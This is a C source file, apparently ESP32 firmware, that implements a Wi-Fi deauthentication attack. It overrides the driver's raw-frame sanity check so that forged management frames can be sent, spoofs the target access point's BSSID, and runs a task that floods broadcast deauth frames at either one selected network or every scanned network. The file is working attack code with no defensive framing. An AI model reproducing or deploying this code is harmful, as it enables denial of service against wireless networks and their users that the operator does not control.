#include <string.h>
#include "attack.h"
#include "config.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

extern wifi_ap_record_t g_ap_list[];
extern int g_ap_count;

int deauth_selection = DEAUTH_SINGLE;

static deauth_packet_t g_deauth_frame = {
    .frame_control     = {0xC0, 0x00}, // 802.11 Deauth
    .duration          = {0x00, 0x00},
    .station           = {0},
    .sender            = {0},
    .access_point      = {0},
    .fragment_sequence = {0xF0, 0xFF},
    .reason            = 0
};

static TaskHandle_t s_deauth_task_handle = NULL;

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

/**
 * @brief The continuous deauth task. Sends frames every loop,
 *        then blinks LED, then short delay.
 * 
 * @param arg Task argument.
 */
static void deauth_task(void *arg) {
    while(1) {
        if(deauth_selection == DEAUTH_SINGLE) {
            uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
            memcpy(g_deauth_frame.station, broadcast, 6);

            for(int i = 0; i < FRAMES_NUMBER; i++)
                esp_wifi_80211_tx(WIFI_IF_AP, &g_deauth_frame, sizeof(g_deauth_frame), false);
        }else{
            uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
            for(int ap_idx = 0; ap_idx < g_ap_count; ap_idx++) {
                memcpy(g_deauth_frame.station, broadcast, 6);
                memcpy(g_deauth_frame.sender, g_ap_list[ap_idx].bssid, 6);
                memcpy(g_deauth_frame.access_point, g_ap_list[ap_idx].bssid, 6);
                for (int i = 0; i < FRAMES_NUMBER; i++)
                    esp_wifi_80211_tx(WIFI_IF_STA, &g_deauth_frame, sizeof(g_deauth_frame), false);
            }
        }

        blink_led(LINK_REPS, BLINK_DELAY);
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}

/**
 * @brief Deauth all stations from our ESP32 AP via broadcast-aid=0.
 */
static void disconnect_all_stations(void) {
    esp_err_t err = esp_wifi_deauth_sta(0);
    if(err == ESP_OK) ESP_LOGI(TAG, "Deauthed all stations from ESP32 AP (broadcast).");
    else ESP_LOGE(TAG, "esp_wifi_deauth_sta(0) failed: %s", esp_err_to_name(err));
}

void start_attack(int wifi_number, int attack_type, uint16_t reason) {
    if(s_deauth_task_handle) {
        vTaskDelete(s_deauth_task_handle);
        s_deauth_task_handle = NULL;
    }

    deauth_selection = attack_type;
    g_deauth_frame.reason = reason;

    ESP_LOGI(TAG, "start_attack => wifi_number=%d, attack_type=%d, reason=%u",
             wifi_number, attack_type, reason);

    esp_wifi_set_ps(WIFI_PS_NONE);

    disconnect_all_stations();

    esp_wifi_stop();

    if(attack_type == DEAUTH_SINGLE) {
        if((wifi_number >= 0) && (wifi_number < g_ap_count)) {
            uint8_t target_channel = g_ap_list[wifi_number].primary;
            ESP_LOGI(TAG, "Reconfiguring AP to channel %d for SINGLE target", target_channel);

            esp_wifi_set_mode(WIFI_MODE_AP);
            wifi_config_t ap_conf;
            esp_wifi_get_config(ESP_IF_WIFI_AP, &ap_conf);
            ap_conf.ap.channel = target_channel;
            esp_wifi_set_config(ESP_IF_WIFI_AP, &ap_conf);
            esp_wifi_start();

            memcpy(g_deauth_frame.access_point, g_ap_list[wifi_number].bssid, 6);
            memcpy(g_deauth_frame.sender,        g_ap_list[wifi_number].bssid, 6);
        }else{
            ESP_LOGE(TAG, "Invalid wifi_number => fallback channel=1");
            esp_wifi_set_mode(WIFI_MODE_AP);
            wifi_config_t ap_conf;
            esp_wifi_get_config(ESP_IF_WIFI_AP, &ap_conf);
            ap_conf.ap.channel = 1;
            esp_wifi_set_config(ESP_IF_WIFI_AP, &ap_conf);
            esp_wifi_start();
        }
    }else{
        ESP_LOGI(TAG, "Switching to STA mode for ALL networks deauth");
        esp_wifi_set_mode(WIFI_MODE_STA);
        esp_wifi_start();
    }

    /* Spams uniformly. */
    xTaskCreatePinnedToCore(
        deauth_task,
        "deauth_task",
        4096,
        NULL,
        2,
        &s_deauth_task_handle,
        tskNO_AFFINITY
    );
}

void stop_attack(void) {
    ESP_LOGI(TAG, "Stopping Attack..");
    if(s_deauth_task_handle) {
        vTaskDelete(s_deauth_task_handle);
        s_deauth_task_handle = NULL;
    }
}
